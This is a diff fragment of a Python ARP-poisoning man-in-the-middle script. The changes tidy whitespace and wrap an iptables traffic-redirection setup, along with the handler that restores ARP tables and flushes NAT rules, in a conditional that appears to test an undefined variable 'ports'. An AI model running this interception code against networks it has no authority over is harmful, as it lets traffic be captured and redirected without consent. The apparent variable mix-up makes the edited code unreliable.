@@ -61,10 +61,10 @@ def arp_poison(gateway, target):
 def arp_restore(signum, frame):
     print("[+] Restoring ARP")
     gateway_mac = get_MAC(gateway)
-    target_mac = get_MAC(target)    
+    target_mac = get_MAC(target)
     send(ARP(op=2, pdst=gateway, psrc=target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=3)
     send(ARP(op=2, pdst=target, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=3)
-    
+
 
 
 if __name__ == "__main__":
@@ -87,8 +87,6 @@ if __name__ == "__main__":
     else:
         target = args.target_ip
 
-    set_iptables(args.target_ip, args.server, args.ports)
-
     def signal_handler(signal, frame):
         disable_ip_forwarding()
         arp_restore(gateway, target)
@@ -96,7 +94,10 @@ if __name__ == "__main__":
         os.system("/sbin/iptables -t nat -F")
         os.system("/sbin/iptables -t nat -X")
         os.system("/sbin/iptables -X")
-        sys.exit(0)    
-    signal.signal(signal.SIGINT, signal_handler)
+        sys.exit(0)
+
+    if ports is not None:
+        set_iptables(args.target_ip, args.server, args.ports)
+        signal.signal(signal.SIGINT, signal_handler)
 
     arp_poison(gateway,target)
